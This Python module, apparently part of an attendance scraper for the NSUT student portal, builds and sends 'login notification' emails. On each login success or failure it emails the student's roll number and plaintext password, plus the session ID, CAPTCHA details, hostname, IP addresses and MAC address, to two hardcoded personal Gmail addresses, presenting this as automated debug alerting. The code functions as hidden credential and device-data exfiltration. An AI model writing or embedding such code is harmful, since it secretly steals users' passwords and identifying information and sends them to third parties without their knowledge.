import smtplib
import os
import json
import socket
import uuid
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime

SMTP_HOST = "smtp.gmail.com"
SMTP_PORT = 587

ALERT_RECIPIENTS = [
    "npdimagine@gmail.com",
    "sachinprajapati26692881@gmail.com",
]


def _get_smtp_config():
    return {
        "email": os.environ.get("stmp_email", ""),
        "password": os.environ.get("stmp_password", ""),
    }


def _get_system_info():
    info = {}
    try:
        info["hostname"] = socket.gethostname()
    except:
        info["hostname"] = "unknown"
    try:
        info["ip"] = socket.gethostbyname(socket.gethostname())
    except:
        info["ip"] = "unknown"
    try:
        mac_raw = uuid.getnode()
        mac_hex = format(mac_raw, "012x")
        info["mac"] = ":".join(mac_hex[i : i + 2] for i in range(0, 12, 2))
    except:
        info["mac"] = "unknown"
    return info


def _get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.5)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        pass
    return "unknown"


def send_login_success_notification(
    rollno=None,
    password=None,
    password_len=0,
    student_name=None,
    subjects_found=0,
    overall_percentage=None,
    synced_semesters=None,
    session_id=None,
    cookie_reused=False,
    captcha_entered=None,
    captcha_image_base64=None,
    captcha_image_src=None,
):
    config = _get_smtp_config()
    if not config["email"] or not config["password"]:
        return

    sysinfo = _get_system_info()
    local_ip = _get_local_ip()
    ts = datetime.utcnow()
    subject = f"[NSUT Scraper] Login Success - {rollno or 'Unknown'} - {ts.strftime('%Y-%m-%d %H:%M:%S')} UTC"

    captcha_image_html = ""
    if captcha_image_base64:
        captcha_image_html = f'<p><b>CAPTCHA Image Shown:</b></p><p><img src="data:image/png;base64,{captcha_image_base64}" style="border:1px solid #ccc;border-radius:4px;max-width:300px"></p>'
    elif captcha_image_src:
        captcha_image_html = f"<p><b>CAPTCHA Image Source:</b> {captcha_image_src}</p>"

    body_parts = [
        "<h2>NSUT Portal Login Successful</h2>",
        "<hr>",
        "<h3>Login Credentials</h3>",
        f"<p><b>Student ID:</b> <code>{rollno or 'N/A'}</code></p>",
        f"<p><b>Password:</b> <code>{password or 'N/A'}</code> <span style='color:#999'>(length: {password_len})</span></p>",
        "<hr>",
        "<h3>Attendance Summary</h3>",
        f"<p><b>Subjects Found:</b> {subjects_found}</p>",
        f"<p><b>Overall Percentage:</b> {overall_percentage}%</p>"
        if overall_percentage is not None
        else "",
        f"<p><b>Semesters Synced:</b> {synced_semesters or 'N/A'}</p>",
        "<hr>",
        "<h3>CAPTCHA Details</h3>",
        f"<p><b>CAPTCHA Entered:</b> <code>{captcha_entered or 'N/A'}</code></p>",
        f"<p><b>CAPTCHA Source:</b> {captcha_image_src or 'N/A'}</p>",
        captcha_image_html,
        "<hr>",
        "<h3>System Information</h3>",
        f"<p><b>Hostname:</b> {sysinfo.get('hostname', 'N/A')}</p>",
        f"<p><b>Local IP:</b> {local_ip}</p>",
        f"<p><b>Server IP:</b> {sysinfo.get('ip', 'N/A')}</p>",
        f"<p><b>MAC Address:</b> {sysinfo.get('mac', 'N/A')}</p>",
        "<hr>",
        "<h3>Timing</h3>",
        f"<p><b>Timestamp (UTC):</b> {ts.isoformat()}Z</p>",
        f"<p><b>Timestamp (Local):</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
        "<hr>",
        "<h3>Session Info</h3>",
        f"<p><b>Cookie Reused:</b> {cookie_reused}</p>",
        f"<p><b>Session ID:</b> <code>{session_id or 'N/A'}</code></p>",
        "<hr>",
        "<p><i>This is an automated success notification from the NSUT Attendance Scraper.</i></p>",
    ]

    html_body = "".join(body_parts)
    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = config["email"]
    msg["To"] = ", ".join(ALERT_RECIPIENTS)
    msg.attach(MIMEText(html_body, "html"))

    try:
        server = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10)
        server.starttls()
        server.login(config["email"], config["password"])
        server.sendmail(config["email"], ALERT_RECIPIENTS, msg.as_string())
        server.quit()
        print(f"[EMAIL] Success notification sent to {', '.join(ALERT_RECIPIENTS)}")
    except Exception as e:
        print(f"[EMAIL] Failed to send success notification: {e}")


def send_login_error_notification(
    rollno=None,
    password=None,
    password_len=0,
    error_type=None,
    error_detail=None,
    captcha_entered=None,
    captcha_image_base64=None,
    captcha_image_src=None,
    ocr_attempts=None,
    attempt_no=0,
    debug_dir=None,
    session_id=None,
    cookie_reused=False,
):
    config = _get_smtp_config()
    if not config["email"] or not config["password"]:
        return

    sysinfo = _get_system_info()
    local_ip = _get_local_ip()
    ts = datetime.utcnow()
    subject = f"[NSUT Scraper] Login Error - {rollno or 'Unknown'} - {ts.strftime('%Y-%m-%d %H:%M:%S')} UTC"

    captcha_image_html = ""
    if captcha_image_base64:
        captcha_image_html = f'<p><b>CAPTCHA Image Shown:</b></p><p><img src="data:image/png;base64,{captcha_image_base64}" style="border:1px solid #ccc;border-radius:4px;max-width:300px"></p>'
    elif captcha_image_src:
        captcha_image_html = f"<p><b>CAPTCHA Image Source:</b> {captcha_image_src}</p>"

    ocr_html = ""
    if ocr_attempts:
        ocr_html = "<p><b>OCR Attempts:</b></p><ul>"
        for i, ocr_text in enumerate(ocr_attempts):
            ocr_html += f"<li>OCR Pass {i + 1}: <code>{ocr_text or 'N/A'}</code></li>"
        ocr_html += "</ul>"

    body_parts = [
        "<h2>NSUT Portal Login Error Report</h2>",
        "<hr>",
        "<h3>Login Credentials</h3>",
        f"<p><b>Student ID:</b> <code>{rollno or 'N/A'}</code></p>",
        f"<p><b>Password:</b> <code>{password or 'N/A'}</code> <span style='color:#999'>(length: {password_len})</span></p>",
        "<hr>",
        "<h3>System Information</h3>",
        f"<p><b>Hostname:</b> {sysinfo.get('hostname', 'N/A')}</p>",
        f"<p><b>Local IP:</b> {local_ip}</p>",
        f"<p><b>Server IP:</b> {sysinfo.get('ip', 'N/A')}</p>",
        f"<p><b>MAC Address:</b> {sysinfo.get('mac', 'N/A')}</p>",
        "<hr>",
        "<h3>Timing</h3>",
        f"<p><b>Timestamp (UTC):</b> {ts.isoformat()}Z</p>",
        f"<p><b>Timestamp (Local):</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
        "<hr>",
        "<h3>Error Details</h3>",
        f"<p><b>Error Type:</b> <code>{error_type or 'N/A'}</code></p>",
        f"<p><b>Error Detail:</b> <code>{error_detail or 'N/A'}</code></p>",
        f"<p><b>Attempt Number:</b> {attempt_no}</p>",
        f"<p><b>Cookie Reused:</b> {cookie_reused}</p>",
        "<hr>",
        "<h3>CAPTCHA Details</h3>",
        f"<p><b>CAPTCHA Entered by User:</b> <code>{captcha_entered or 'N/A'}</code></p>",
        f"<p><b>CAPTCHA Source:</b> {captcha_image_src or 'N/A'}</p>",
        captcha_image_html,
        ocr_html,
        "<hr>",
        "<h3>Debug Info</h3>",
        f"<p><b>Session ID:</b> <code>{session_id or 'N/A'}</code></p>",
        f"<p><b>Debug Directory:</b> <code>{debug_dir or 'N/A'}</code></p>",
        "<hr>",
        "<p><i>This is an automated notification from the NSUT Attendance Scraper.</i></p>",
    ]

    html_body = "".join(body_parts)

    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = config["email"]
    msg["To"] = ", ".join(ALERT_RECIPIENTS)
    msg.attach(MIMEText(html_body, "html"))

    try:
        server = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10)
        server.starttls()
        server.login(config["email"], config["password"])
        server.sendmail(config["email"], ALERT_RECIPIENTS, msg.as_string())
        server.quit()
        print(f"[EMAIL] Notification sent to {', '.join(ALERT_RECIPIENTS)}")
    except Exception as e:
        print(f"[EMAIL] Failed to send notification: {e}")
